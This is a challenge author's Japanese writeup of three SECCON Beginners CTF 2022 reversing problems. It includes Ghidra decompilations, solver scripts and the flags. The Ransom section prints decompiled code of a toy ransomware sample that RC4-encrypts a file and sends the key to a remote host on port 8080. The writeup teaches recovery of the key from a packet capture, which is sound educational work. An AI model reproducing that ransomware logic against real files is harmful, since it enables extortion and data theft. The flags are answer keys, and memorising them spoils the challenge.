---
title: "SECCON Beginners CTF 2022【Reversing】Quiz Recursive Ransom 作問者writeup"
description: "SECCON Beginners CTF 2022【Reversing】Quiz Recursive Ransom 作問者writeup"
authors: [hi120ki]
tags: [CTF, SECCON, ctf4b]
slug: posts/20220605-1
---

SECCON Beginners CTF 2022で出題したReversing問題Quiz、Recursive、Ransomの作問者writeupです。

## Quiz (難易度 Beginner)

Reversingは主にバイナリなどのファイルの動作を解析する分野です。まずはファイルをダウンロードして解凍します。

<!-- truncate -->

```
$ wget https://sbc2022-secconbeginnersctf-2022-prod.s3.isk01.sakurastorage.jp/production/Quiz/quiz.tar.gz
$ tar -zxvf quiz.tar.gz
```

すると`quiz`というファイルが出てきます。

```
$ ls
quiz quiz.tar.gz
```

fileコマンドでどんなファイルか調べてみるとLinuxの実行ファイルだと分かります。

```
$ file quiz
quiz: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3c3ecb93f6ca813352964076835ff6712fe9554e, for GNU/Linux 3.2.0, not stripped
```

> `ELF`がLinuxで用いられる実行ファイルのフォーマットで、さらにこの実行ファイルはx86-64環境で実行できるものだと分かります。

実行するために権限を与えます。

```
$ chmod +x quiz
```

実行してみると問題名の通りクイズが出てきます。これに順番に答えていくと最後に`フラグはなんでしょうか？`と聞かれます。

```
$ ./quiz
Welcome, it's time for the binary quiz!
ようこそ、バイナリクイズの時間です!

Q1. What is the executable file's format used in Linux called?
    Linuxで使われる実行ファイルのフォーマットはなんと呼ばれますか？
    1) ELM  2) ELF  3) ELR
Answer : 2
Correct!

Q2. What is system call number 59 on 64-bit Linux?
    64bit Linuxにおけるシステムコール番号59はなんでしょうか？
    1) execve  2) folk  3) open
Answer : 1
Correct!

Q3. Which command is used to extract the readable strings contained in the file?
    ファイルに含まれる可読文字列を抽出するコマンドはどれでしょうか？
    1) file  2) strings  3) readelf
Answer : 2
Correct!

Q4. What is flag?
    フラグはなんでしょうか？
Answer :
```

フラグはここまでのクイズでは何も分かりませんが、答えを入力するとその文字列を答えのフラグ文字列と比較しているのではないか、と考えられます。

ここでQ3のクイズを振り返るとファイルに含まれる可読文字列を抽出するコマンドが`strings`であると分かります。

では実際にstringsコマンドでこのファイルを指定して実行してみると

```
$ strings quiz
...
[]A\A]A^A_
ctf4b{w0w_d1d_y0u_ca7ch_7h3_fl4g_1n_0n3_sh07?}
Welcome, it's time for the binary quiz!
...
```

フラグを取得することができました。

> このファイルでは入力文字列とフラグ文字列`ctf4b{w0w_d1d_y0u_ca7ch_7h3_fl4g_1n_0n3_sh07?}`をstrncmpで比較しているので、そのままバイナリ内に可読文字列として残っていました。
> quiz以降の難易度が高い問題ではこの問題のような単純な比較ではなく、いくつかの処理で文字列を比較したりエンコード・デコード処理がある場合があるので、それらを解析してフラグを取得することを求められます。

## Recursive (難易度 Easy)

quizと同様にダウンロード・実行権限を付与・実行してみると入力した文字列がフラグと一致するか確認してくれるようです。

```
$ ./recursive

   ▄▀▀▄▀▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▄▄▄▄   ▄▀▀▄ ▄▀▀▄  ▄▀▀▄▀▀▀▄  ▄▀▀▀▀▄  ▄▀▀█▀▄   ▄▀▀▄ ▄▀▀▄  ▄▀▀█▄▄▄▄
  █   █   █ ▐  ▄▀   ▐ █ █    ▌ █   █    █ █   █   █ █ █   ▐ █   █  █ █   █    █ ▐  ▄▀   ▐
  ▐  █▀▀█▀    █▄▄▄▄▄  ▐ █      ▐  █    █  ▐  █▀▀█▀     ▀▄   ▐   █  ▐ ▐  █    █    █▄▄▄▄▄
   ▄▀    █    █    ▌    █        █    █    ▄▀    █  ▀▄   █      █       █   ▄▀    █    ▌
  █     █    ▄▀▄▄▄▄    ▄▀▄▄▄▄▀    ▀▄▄▄▄▀  █     █    █▀▀▀    ▄▀▀▀▀▀▄     ▀▄▀     ▄▀▄▄▄▄
  ▐     ▐    █    ▐   █     ▐             ▐     ▐    ▐      █       █            █    ▐
             ▐        ▐                                     ▐       ▐            ▐

FLAG: ctf4b{???}
Incorrect.
```

このような動作がわからない実行ファイルを静的解析するソフトとして[Ghidra](https://ghidra-sre.org/)があります。

Ghidraでこのファイルを開いてmain関数のデコンパイル結果を見ると以下のようになっています。

```cpp
undefined8 main(void)
{
  int iVar1;
  size_t sVar2;
  undefined8 uVar3;
  long in_FS_OFFSET;
  char local_58 [72];
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  show_description();
  printf("FLAG: ");
  __isoc99_scanf("%39s%*[^\n]",local_58);
  sVar2 = strlen(local_58);
  if (sVar2 == 0x26) {
    iVar1 = check(local_58,0);
    if (iVar1 == 1) {
      puts("Incorrect.");
      uVar3 = 1;
    }
    else {
      puts("Correct!");
      uVar3 = 0;
    }
  }
  else {
    puts("Incorrect.");
    uVar3 = 1;
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar3;
}
```

check関数の中を見て（変数名を整理して）みると、文字列を2分割し`check(half_text,n)`と`check(half_text,half_len * half_len + n)`という処理を行い、文字列の長さが1のときは`table[n]`と比較する処理をしています。

```cpp
undefined8 check(char *text,int n)
{
  int text_len;
  int half_len;
  int iVar1;
  size_t text_strlen;
  char *half_text;

  text_strlen = strlen(text);
  text_len = (int)text_strlen;
  if (text_len == 1) {
    if (table[n] != *text) {
      return 1;
    }
  }
  else {
    half_len = text_len / 2;
    half_text = (char *)malloc((long)half_len);
    strncpy(half_text,text,(long)half_len);
    iVar1 = check(half_text,n);
    if (iVar1 == 1) {
      return 1;
    }
    half_text = (char *)malloc((long)(text_len - half_len));
    strncpy(half_text,text + half_len,(long)(text_len - half_len));
    text_len = check(half_text,half_len * half_len + n);
    if (text_len == 1) {
      return 1;
    }
  }
  return 0;
}
```

これをPython風に書き直してみると

```python
def check(text, n):
    if len(text) == 1:
        print(chr(table[n]), end="")
    else:
        t = len(text) // 2
        check(text[:t], n)
        check(text[t:], n + t**2)

check("a" * 38, 0)
```

Ghidraで見るとtableは以下のような配列になっています。

```
00104020 63    undefined163h          [0]
00104021 74    undefined174h          [1]
00104022 60    undefined160h          [2]
...
```

これらから正解の文字列を求めるスクリプトを書くと

```python
table = [99, 116, 96, 42, 102, 52, ... , 52]

def check(text, n):
    if len(text) == 1:
        print(chr(table[n]), end="")
    else:
        t = len(text) // 2
        check(text[:t], n)
        check(text[t:], n + t**2)

check("a" * 38, 0)
```

フラグ`ctf4b{r3curs1v3_c4l1_1s_4_v3ry_u53fu1}`を取得できます。

## Ransom (難易度 Medium)

ファイルをダウンロードして解凍すると3つのファイル`ctf4b_super_secret.txt.lock` `tcpdump.pcap` `ransom`が入っています。まずは`ransom`をGhidraで解析しどんな処理が行われているか確認します。

Ghidraで開くと`Symbol Tree - Functions`にmain関数がなく`FUN_00101020`などのよく分からない関数が表示されます。これはstripというシンボル情報を削除する処理が行われた実行ファイルであるためで、まずはmain関数に相当する関数を見つけ出す必要があります。

まず`Symbol Tree - Functions`から`entry`を選択し表示します。これがエントリーポイントでこの中の`__libc_start_main`の第一引数がmain関数に相当します。今回だと`FUN_001016a2`でこれを表示すると、この関数の中で先程ダウンロードした`ctf4b_super_secret.txt.lock`ファイルへの操作が行われているのが確認できます。

```cpp
undefined8 FUN_001016a2(void)
{
  int __fd;
  int iVar1;
  void *unknown_text;
  FILE *secret_file;
  undefined8 uVar2;
  char *pcVar3;
  size_t sVar4;
  void *lock_text;
  FILE *__stream;
  long in_FS_OFFSET;
  size_t local_150;
  undefined local_128 [4];
  in_addr_t local_124;
  char secret_text [264];
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  unknown_text = malloc(0x11);
  FUN_00101606(0x10,unknown_text);
  secret_file = fopen("ctf4b_super_secret.txt","r");
  if (secret_file == (FILE *)0x0) {
    puts("Can\'t open file.");
    uVar2 = 1;
  }
  else {
    pcVar3 = fgets(secret_text,0x100,secret_file);
    if (pcVar3 != (char *)0x0) {
      sVar4 = strlen(secret_text);
      lock_text = malloc(sVar4 << 2);
      FUN_0010157f(unknown_text,secret_text,lock_text);
      __stream = fopen("ctf4b_super_secret.txt.lock","w");
      if (__stream == (FILE *)0x0) {
        puts("Can\'t write file.");
        uVar2 = 1;
        goto LAB_0010191f;
      }
      local_150 = 0;
      while( true ) {
        sVar4 = strlen(secret_text);
        if (local_150 == sVar4) break;
        fprintf(__stream,"\\x%02x",(ulong)*(byte *)(local_150 + (long)lock_text));
        local_150 = local_150 + 1;
      }
      fclose(__stream);
    }
    fclose(secret_file);
    __fd = socket(2,1,0);
    if (__fd < 0) {
      perror("Failed to create socket");
      uVar2 = 1;
    }
    else {
      local_128._0_2_ = 2;
      local_124 = inet_addr("192.168.0.225");
      local_128._2_2_ = htons(8080);
      iVar1 = connect(__fd,(sockaddr *)local_128,0x10);
      if (iVar1 == 0) {
        write(__fd,unknown_text,0x11);
        uVar2 = 0;
      }
      else {
        perror("Failed to connect");
        uVar2 = 1;
      }
    }
  }
LAB_0010191f:
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar2;
}
```

この動作を見ると

1. `FUN_00101606(0x10,unknown_text);`で`unknown_text`を生成する
2. `ctf4b_super_secret.txt`から`secret_text`を読み込む
3. `FUN_0010157f(unknown_text,secret_text,lock_text);`で`unknown_text`と`secret_text`から`lock_text`を生成?する
4. `ctf4b_super_secret.txt.lock`に`lock_text`を書き込む
5. `192.168.0.225:8080`に`unknown_text`を送信する

という流れになっています。

では1の`FUN_00101606`の動作を見てみると`0-9a-zA-Z`の文字を使うparam_1(今回は0x10)の長さのランダム文字列を生成しparam_2に格納する処理だと分かります。

```cpp
void FUN_00101606(int param_1,long param_2)
{
  int iVar1;
  time_t tVar2;
  ulong local_18;

  tVar2 = time((time_t *)0x0);
  srand((uint)tVar2);
  for (local_18 = 0; local_18 < (ulong)(long)param_1; local_18 = local_18 + 1) {
    iVar1 = rand();
    *(char *)(local_18 + param_2) =
         "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"[iVar1 % 0x3e];
  }
  *(undefined *)(param_2 + param_1) = 0;
  return;
}
```

次に3の`FUN_0010157f`は新たな関数`FUN_00101381`と`FUN_0010145e`を呼んでいることが分かります。

```cpp
undefined8 FUN_0010157f(undefined8 param_1,undefined8 param_2,undefined8 param_3)
{
  long in_FS_OFFSET;
  undefined local_118 [264];
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  FUN_00101381(param_1,local_118);
  FUN_0010145e(local_118,param_2,param_3);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

`FUN_00101381`と`FUN_0010145e`の処理は以下のようになっています。

```cpp
undefined8 FUN_00101381(char *param_1,long param_2)
{
  uint uVar1;
  size_t sVar2;
  int iVar3;
  int local_18;
  int local_14;
  int local_10;

  sVar2 = strlen(param_1);
  local_18 = 0;
  for (local_14 = 0; local_14 < 0x100; local_14 = local_14 + 1) {
    *(char *)(param_2 + local_14) = (char)local_14;
  }
  for (local_10 = 0; local_10 < 0x100; local_10 = local_10 + 1) {
    iVar3 = (uint)*(byte *)(param_2 + local_10) + local_18 + (int)param_1[local_10 % (int)sVar2];
    uVar1 = (uint)(iVar3 >> 0x1f) >> 0x18;
    local_18 = (iVar3 + uVar1 & 0xff) - uVar1;
    FUN_00101349(param_2 + local_10,local_18 + param_2);
  }
  return 0;
}
```

```cpp
undefined8 FUN_0010145e(long param_1,char *param_2,long param_3)
{
  size_t sVar1;
  uint local_24;
  uint local_20;
  ulong local_18;

  local_24 = 0;
  local_20 = 0;
  local_18 = 0;
  sVar1 = strlen(param_2);
  for (; local_18 < sVar1; local_18 = local_18 + 1) {
    local_24 = local_24 + 1 & 0xff;
    local_20 = *(byte *)(param_1 + (int)local_24) + local_20 & 0xff;
    FUN_00101349(param_1 + (int)local_24,(int)local_20 + param_1);
    *(byte *)(local_18 + param_3) =
         param_2[local_18] ^
         *(byte *)(param_1 +
                  (ulong)(byte)(*(char *)(param_1 + (int)local_20) +
                               *(char *)(param_1 + (int)local_24)));
  }
  return 0;
}
```

forループを回しながらXORなどでエンコードしていますが、これらはRC4と呼ばれる暗号化手法です。RC4はある文字列を鍵を用いて暗号化するもので今回は1で生成した16文字のランダム文字列`unknown_text`を鍵にして`ctf4b_super_secret.txt`の内容を暗号化し、`ctf4b_super_secret.txt.lock`に書き込む処理をしています。

よって`ctf4b_super_secret.txt.lock`からもとの内容を戻すためには`unknown_text`が必要ですが、5で`unknown_text`を送信しておりそれが配布pcapファイルに記録されています。

pcapファイルから暗号化キーは`rgUAvvyfyApNPEYg`であることが分かるのでCyberChefを使い、RC4を指定して復号するとフラグ`ctf4b{rans0mw4re_1s_v4ry_dan9er0u3_s0_b4_c4refu1}`が取得できます。

[CyberChef](<https://gchq.github.io/CyberChef/#recipe=From_Hex('%5C%5Cx')RC4(%7B'option':'Latin1','string':'rgUAvvyfyApNPEYg'%7D,'Latin1','Latin1')&input=XHgyYlx4YTlceGYzXHg2Zlx4YTJceDJlXHhjZFx4ZjNceDc4XHhjY1x4YjdceGEwXHhkZVx4NmRceGIxXHhkNFx4MjRceDNjXHg4YVx4ODlceGEzXHhjZVx4YWJceDMwXHg3Zlx4YzJceGI5XHgwY1x4YjlceGY0XHhlN1x4ZGFceDI1XHhjZFx4ZmNceDRlXHhjN1x4OWVceDdlXHg0M1x4MmJceDNiXHhkY1x4MDlceDgwXHg5Nlx4OTVceGY2XHg3Nlx4MTA>)
